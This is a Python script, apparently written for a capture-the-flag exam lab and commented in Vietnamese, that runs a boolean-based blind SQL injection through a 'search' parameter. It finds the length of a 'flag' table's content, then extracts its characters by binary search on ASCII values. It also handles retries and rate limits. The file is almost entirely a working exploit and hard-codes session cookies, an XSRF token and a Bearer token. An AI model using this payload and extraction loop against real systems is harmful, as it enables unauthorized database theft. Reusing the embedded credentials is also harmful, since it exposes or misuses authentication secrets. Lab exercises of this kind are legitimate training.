import requests
import string
import time

# --- Cấu hình ---
BASE_URL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/links"

# === SAO CHÉP CHÍNH XÁC TỪ REQUEST MẪU CỦA BẠN ===
COOKIE_VALUE = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjhycUZqakRoRENmSllKL3ZTOVk5YXc9PSIsInZhbHVlIjoiRis0dUJTNjVVTnhGWWFNNmFDTlB4ZTRUN1dhbDJHSW1WNWUydHBjcWRoYjZON01Fd3AyaXJCdVBZR0p2c3oyNytKRHg0S25pVWd4SVNmQ3pURXM2YTd0bDBBRG1URTBvVzZSVUlRM1N2MTQ0YjNHSGhQZDVOa2NoQlFmVjYvRWpEcVJEVDl2NElxMitNR1JRYW5BRVdkMEsxT1kreldDYU5kMlh6Qk1MWGxZaFpsMCtXdS9ZVENzMEZ0djlrQnhZL1R1cGFSVjhxc2E1K09KVDNPV0psL1pCMnF4KzIzSThGU2tHNCtxdVhkRT0iLCJtYWMiOiI2YTJlMGVhYjA0YmVhYWJlZDFlYTg0YTI1YTJhYmRiMzY5ZGJlN2M2NjAwMjdlNTA3YzhmODIzZjJlZGUxNmEzIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ii9sZ09qeEFEbCttT1ZPYWNhVExMOVE9PSIsInZhbHVlIjoiSFllbWgzUUs5MWJSOXpZNFlIWkszblpTd3dENG5ROStHYVpES2l4QUhqRnZhVlFJa0FhRmx5ai90cFd5Rlg0c1JrZ2orVHY0U2tnbE1sMTJVMVNrS2FLVWVUa0gxMFBVNnY2clliWENuZ1pGZ2FWYmZxWnQvdUNoaVhpTVlhQmciLCJtYWMiOiIxODRjMWZhYzhlNmJkMWFhMmJjNmZiYjliYjNhZDk3MDU4YTY5OGMxZmRlZjY3ZjJiYmQ3YjYyZThjYzYyOTlhIiwidGFnIjoiIn0%3D; cybershortlink_session=eyJpdiI6InVXZ2N0djVXM3k4bm1uR1F5ZW5RSEE9PSIsInZhbHVlIjoibE1zWWhUVkR3S0NCT0psVW5aK00vT1BsdFhyNHNGK0o2WnZDSWphbHBGL1QyRTJZVmUvamsrZkhmUHVvNjV6K3duNmcxMVhnNzBUVGZIeDB0SVAvMDJvSFhQQXNpb0VqbzNjZkY4RXpUQXR0Wkk3ZGVEcTJhMnFzUC9pOHcwQjQiLCJtYWMiOiI1NTRkYmEwNmRkY2EyNTQxNmRiY2EwNzcwMTQ2ODg2NjUzZjUxNjQzYmRiMjY5MGEyM2EyMjBlMTNlOTY2NjU2IiwidGFnIjoiIn0%3D"

AUTHORIZATION_TOKEN="Bearer 12|7IFPcgJ3iKGxjTBDVmC0RTfFGqx3W2L1CsZLdyIB9c79e59c"

REQUEST_HEADERS = {
    'Host': 'cybershortlink-dc105f08.exam.cyberjutsu-lab.tech',
    'Cookie': COOKIE_VALUE,
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Authorization': AUTHORIZATION_TOKEN,
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'application/json',
    'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/dashboard',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}
# ----------------------------------------------------

# --- Cấu hình thời gian và retry ---
REQUEST_TIMEOUT = 30  # Timeout cho mỗi request (giây)
SLEEP_BETWEEN_REQUESTS = 10.0 # Thời gian nghỉ giữa các request (giây), tăng lên nếu cần
MAX_RETRIES = 2 # Số lần thử lại tối đa cho một request nếu gặp lỗi mạng/timeout
RETRY_SLEEP = 5 # Thời gian nghỉ giữa các lần thử lại (giây)
# ------------------------------------

MIN_ASCII = 32
MAX_ASCII = 126

def build_payload_sql(condition_sql):
    return f"x' OR ({condition_sql}) OR 'a'='b"

def make_request(condition_sql, attempt=1):
    payload_param_value = build_payload_sql(condition_sql)
    params = {'search': payload_param_value}
    
    # print(f"DEBUG: Attempt {attempt} for condition: {condition_sql[:50]}...") # Debug

    try:
        response = requests.get(BASE_URL, params=params, headers=REQUEST_HEADERS, timeout=REQUEST_TIMEOUT)
        
        # print(f"DEBUG: Status: {response.status_code}, Content-Type: {response.headers.get('Content-Type')}, Len: {len(response.text)}") # Debug

        if 'application/json' in response.headers.get('Content-Type', '').lower():
            try:
                json_data = response.json()
                if isinstance(json_data, list):
                    return len(json_data) > 0
                else:
                    # print("WARN: JSON response không phải là list.")
                    return False
            except ValueError:
                # print(f"ERROR: Lỗi giải mã JSON (Attempt {attempt}). Response text: {response.text[:200]}")
                return False
        else:
            # print(f"ERROR: Content-Type không phải JSON (Attempt {attempt}). Actual: {response.headers.get('Content-Type')}")
            # print(f"Response text: {response.text[:200]}")
            return False

    except requests.exceptions.Timeout:
        print(f"WARN: Request Timeout (Attempt {attempt}/{MAX_RETRIES}) cho: {condition_sql[:50]}...")
        if attempt < MAX_RETRIES:
            print(f"  Sẽ thử lại sau {RETRY_SLEEP} giây...")
            time.sleep(RETRY_SLEEP)
            return make_request(condition_sql, attempt + 1) # Thử lại
        else:
            print(f"ERROR: Request Timeout sau {MAX_RETRIES} lần thử. Bỏ qua điều kiện này.")
            return "REQUEST_FAILED_MAX_RETRIES" # Trả về giá trị đặc biệt để xử lý ở trên
            
    except requests.exceptions.RequestException as e:
        print(f"WARN: Request Exception (Attempt {attempt}/{MAX_RETRIES}): {e} cho: {condition_sql[:50]}...")
        if attempt < MAX_RETRIES:
            print(f"  Sẽ thử lại sau {RETRY_SLEEP} giây...")
            time.sleep(RETRY_SLEEP)
            return make_request(condition_sql, attempt + 1) # Thử lại
        else:
            print(f"ERROR: Request Exception sau {MAX_RETRIES} lần thử: {e}. Bỏ qua điều kiện này.")
            return "REQUEST_FAILED_MAX_RETRIES" # Trả về giá trị đặc biệt


def get_flag_length():
    print("[+] Đang tìm độ dài của flag...")
    for length in range(1, 101):
        print(f"  Kiểm tra độ dài = {length}")
        condition = f"(SELECT LENGTH(content) FROM flag LIMIT 1) = {length}"
        result = make_request(condition)

        if result is True:
            print(f"[+] Độ dài flag được tìm thấy: {length}")
            return length
        elif result == "REQUEST_FAILED_MAX_RETRIES":
            print(f"!!! Lỗi request nghiêm trọng khi tìm độ dài {length}. Dừng tìm độ dài.")
            return 0 # Hoặc raise Exception
        
        time.sleep(SLEEP_BETWEEN_REQUESTS)
    print("[-] Không tìm thấy độ dài flag (hoặc quá dài / lỗi request).")
    return 0

def get_char_at_pos(position, min_val=MIN_ASCII, max_val=MAX_ASCII):
    # Thử kiểm tra trực tiếp các ký tự nghi ngờ trước (nếu có)
    # suspected_chars = ['_', '|'] 
    # for char_code in [ord(c) for c in suspected_chars]:
    #     condition_eq_direct = f"(SELECT ASCII(SUBSTRING(content,{position},1)) FROM flag LIMIT 1) = {char_code}"
    #     result_direct = make_request(condition_eq_direct)
    #     if result_direct is True:
    #         return chr(char_code)
    #     elif result_direct == "REQUEST_FAILED_MAX_RETRIES":
    #         print(f"!!! Lỗi request nghiêm trọng khi kiểm tra trực tiếp ký tự ASCII {char_code} tại vị trí {position}.")
    #         return "ERROR_REQUEST" # Báo lỗi lên trên
    #     time.sleep(SLEEP_BETWEEN_REQUESTS)

    low = min_val
    high = max_val
    found_char_code = -1

    while low <= high:
        mid = (low + high) // 2
        if mid < min_val: mid = min_val
        if mid > max_val: mid = max_val
        
        # print(f"    Vị trí {position}, thử ASCII > {mid} ('{chr(mid)}')") # Debug
        condition_gt = f"(SELECT ASCII(SUBSTRING(content,{position},1)) FROM flag LIMIT 1) > {mid}"
        result_gt = make_request(condition_gt)

        if result_gt == "REQUEST_FAILED_MAX_RETRIES":
            print(f"!!! Lỗi request nghiêm trọng khi so sánh > {mid} tại vị trí {position}.")
            return "ERROR_REQUEST"
        
        if result_gt is True: # ASCII thực tế > mid
            low = mid + 1
        else: # ASCII thực tế <= mid (hoặc lỗi request đã được xử lý là False)
            # print(f"    Vị trí {position}, thử ASCII = {mid} ('{chr(mid)}')") # Debug
            condition_eq = f"(SELECT ASCII(SUBSTRING(content,{position},1)) FROM flag LIMIT 1) = {mid}"
            result_eq = make_request(condition_eq)

            if result_eq == "REQUEST_FAILED_MAX_RETRIES":
                print(f"!!! Lỗi request nghiêm trọng khi so sánh = {mid} tại vị trí {position}.")
                return "ERROR_REQUEST"

            if result_eq is True: # ASCII thực tế == mid
                found_char_code = mid
                break
            else: # ASCII thực tế < mid
                high = mid - 1
        time.sleep(SLEEP_BETWEEN_REQUESTS)

    if found_char_code != -1:
        return chr(found_char_code)
    
    # print(f"  Không tìm thấy ký tự tại vị trí {position} bằng tìm kiếm nhị phân trong dải [{min_val}-{max_val}]")
    return None # Không tìm thấy trong dải


def extract_flag_binary_search_ascii():
    flag_length = get_flag_length()
    if not flag_length or flag_length == 0 :
        print("Không thể xác định độ dài flag. Dừng script.")
        return None

    print("[+] Bắt đầu trích xuất flag...")
    extracted_flag = ""
    for i in range(1, flag_length + 1): # Vị trí trong SUBSTRING bắt đầu từ 1
        print(f"  Đang tìm ký tự tại vị trí {i}/{flag_length}...")
        char_result = get_char_at_pos(i)
        
        if char_result == "ERROR_REQUEST":
            print(f"Lỗi request không thể phục hồi khi tìm ký tự tại vị trí {i}. Dừng lại.")
            return extracted_flag + "[FATAL_REQUEST_ERROR]"
        elif char_result:
            extracted_flag += char_result
            print(f"  Ký tự tìm thấy: '{char_result}'. Flag hiện tại: {extracted_flag}")
        else:
            print(f"  [-] Không tìm thấy ký tự (hoặc lỗi không nghiêm trọng) tại vị trí {i}. Dừng lại.")
            return extracted_flag + "[TRUNCATED_OR_UNKNOWN_CHAR]"
        
        # Không cần sleep ở đây nữa vì đã có SLEEP_BETWEEN_REQUESTS trong các hàm con

    return extracted_flag

if __name__ == "__main__":
    print("Bắt đầu script trích xuất flag (cải thiện xử lý rate limit/timeout)...")
    
    if "YOUR_COOKIE_STRING" in COOKIE_VALUE or "YOUR_AUTH_TOKEN" in AUTHORIZATION_TOKEN:
        print("[ERROR] Vui lòng cập nhật COOKIE_VALUE và AUTHORIZATION_TOKEN trong script!")
    else:
        # Test nhỏ trước khi chạy full script (Tùy chọn, có thể comment lại nếu đã chắc chắn)
        # print("\n>>> Thực hiện test request đơn giản với config mới...")
        # test_condition_true = "(SELECT 1)=1"
        # result_true = make_request(test_condition_true)
        # print(f"Kết quả test (ĐÚNG): {result_true}")
        # test_condition_false = "(SELECT 1)=0"
        # result_false = make_request(test_condition_false)
        # print(f"Kết quả test (SAI): {result_false}")
        # if result_true is True and result_false is False:
        #     print("[XÁC NHẬN] Cơ chế Boolean-based với config mới HOẠT ĐỘNG!\n")
        # else:
        #     print("[VẤN ĐỀ] Cơ chế Boolean-based với config mới KHÔNG hoạt động. Kiểm tra output.\n")
        #     exit() # Dừng nếu test cơ bản không qua

        flag = extract_flag_binary_search_ascii()
        if flag:
            print(f"\n[SUCCESS] Flag được trích xuất: {flag}")
        else:
            print("\n[FAILURE] Không thể trích xuất flag.")
